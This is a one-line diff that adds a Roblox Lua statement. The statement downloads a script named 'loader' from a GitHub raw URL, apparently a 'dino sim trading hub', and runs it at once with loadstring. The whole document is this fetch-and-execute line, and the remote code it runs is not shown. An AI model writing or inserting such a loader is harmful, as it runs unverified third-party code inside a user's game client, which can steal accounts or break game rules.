@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reconside/dinosimtradinghub/main/loader"))()
